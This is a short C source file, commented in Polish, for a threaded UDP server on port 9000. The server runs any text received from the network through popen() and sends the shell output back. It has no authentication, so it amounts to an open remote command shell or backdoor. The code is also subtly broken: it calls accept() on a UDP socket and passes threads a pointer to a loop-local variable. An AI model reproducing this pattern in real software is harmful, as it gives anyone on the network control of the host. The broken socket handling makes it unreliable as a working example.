#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PORT 9000
#define BUFFER_SIZE 1024

void* handle_client(void* arg) {
    int sockfd = *((int*)arg);
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);

    ssize_t n = recvfrom(sockfd, buffer, BUFFER_SIZE - 1, 0, (struct sockaddr*)&client_addr, &client_len);
    if (n < 0) {
        perror("Error reading from socket");
        close(sockfd);
        pthread_exit(NULL);
    }

    char output[BUFFER_SIZE];
    memset(output, 0, BUFFER_SIZE);
    // Wykonaj polecenie i zapisz wynik do zmiennej output

    // Przykład: Wykonaj polecenie w powłoce systemowej
    FILE* fp = popen(buffer, "r");
    if (fp == NULL) {
        perror("Error executing command");
        close(sockfd);
        pthread_exit(NULL);
    }

    while (fgets(output, BUFFER_SIZE, fp) != NULL) {
        sendto(sockfd, output, strlen(output), 0, (struct sockaddr*)&client_addr, client_len);
        memset(output, 0, BUFFER_SIZE);
    }

    pclose(fp);

    close(sockfd);
    pthread_exit(NULL);
}

int main() {
    int sockfd;
    struct sockaddr_in serv_addr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Error opening socket");
        exit(1);
    }

    memset(&serv_addr, 0, sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(PORT);

    if (bind(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Error on binding");
        exit(1);
    }

    printf("Server listening on port %d...\n", PORT);

    pthread_t tid;

    while (1) {
        int newsockfd;
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);

        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &client_len);
        if (newsockfd < 0) {
            perror("Error on accept");
            exit(1);
        }

        pthread_create(&tid, NULL, handle_client, (void*)&newsockfd);
        pthread_detach(tid);
    }

    close(sockfd);
    return 0;
}